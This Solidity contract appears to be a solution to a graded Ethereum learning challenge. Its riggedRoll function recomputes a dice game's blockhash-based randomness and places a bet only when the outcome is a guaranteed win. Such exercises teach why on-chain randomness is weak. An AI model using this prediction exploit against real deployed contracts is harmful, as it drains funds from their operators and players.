pragma solidity >=0.8.0 <0.9.0;  // Do not change the solidity version as it negatively impacts submission grading
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// Declaring the RiggedRoll contract that inherits from the Ownable contract
contract RiggedRoll is Ownable {

    // Declaring a public variable of type DiceGame to interact with the DiceGame contract
    DiceGame public diceGame;

    // Constructor to initialize the diceGame variable with the address of the deployed DiceGame contract
    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable _to, uint256 _amount) external onlyOwner {
        // Ensure the contract has enough balance to withdraw
        require(address(this).balance >= _amount, "Insufficient balance in contract");
        // Transfer the specified amount to the provided address
        _to.transfer(_amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient balance for the roll.");

        // Fetching the current block hash and converting it to an unsigned integer
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 imported_nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), imported_nonce));
        uint256 roll = uint256(hash) % 16;

        // Check if the roll is a winning number
        require(roll <= 5, "Predicted roll is not a winning number, bailing.");

        // Call the rollTheDice function in the DiceGame contract
        diceGame.rollTheDice{value: 0.002 ether}();

        console.log("THE ROLL IS a WINNER!");
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {
        // Log the received amount for debugging purposes
        console.log("Received Ether:", msg.value);
    }
}